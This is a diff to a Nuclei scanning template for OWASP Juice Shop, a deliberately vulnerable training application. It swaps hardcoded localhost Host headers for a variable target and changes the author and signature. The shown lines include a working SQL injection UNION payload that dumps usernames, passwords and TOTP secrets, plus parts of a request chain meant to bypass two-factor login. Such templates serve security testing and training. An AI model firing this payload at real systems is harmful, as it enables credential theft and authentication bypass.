@@ -2,7 +2,7 @@ id: two_factor_authenticate_flow
 
 info:
   name: Juice Shop Two-Factor Authentication (Flow)
-  author: pdteam
+  author: baothang
   severity: high
   description: "Exploits SQLi to extract TOTP secret and bypass 2FA"
   reference:
@@ -25,7 +25,7 @@ requests:
         /rest/products/search?q=test'))%20UNION%20SELECT%20username,%20password,%20role,%20deletedAt,%20isActive,%20totpSecret%20AS%20TOTP,%20id,%20email,%20profileImage%20FROM%20USERS--
         HTTP/1.1
 
-        Host: 127.0.0.1:3000
+        Host: {{Hostname}}
     matchers:
       - type: word
         part: body
@@ -50,7 +50,7 @@ requests:
   - raw:
       - |
         POST /rest/user/login HTTP/1.1
-        Host: 127.0.0.1:3000
+        Host: {{Hostname}}
         Content-Type: application/json
         User-Agent: nuclei
         Accept: */*
@@ -72,7 +72,7 @@ requests:
   - raw:
       - |
         POST /rest/2fa/verify HTTP/1.1
-        Host: 127.0.0.1:3000
+        Host: {{Hostname}}
         Content-Type: application/json
         Content-Length: 71
 
@@ -114,4 +114,4 @@ code:
       
       # Output must be in JSON format for Nuclei to parse
       print(otp)
-# digest: 4b0a00483046022100fbaad6ddb3bc2710e2ae9a3938d2c394fb56b2c3854e851d7f8d8641ccef1041022100da2106f11d4f58c969534e2f77d74c6da44496ac54f8b70371954da1aead1f5f:0dd34f63ed422f65711fe796f66903bf
+# digest: 4b0a004830460221009886f01770e21284ddff2595eff05899aecff7d97f52654f88c4565d42ba8975022100e02597a46d73ceeed9a183160da57a95435c8b8bc9bbc5248399bae3d3ed1f11:0dd34f63ed422f65711fe796f66903bf
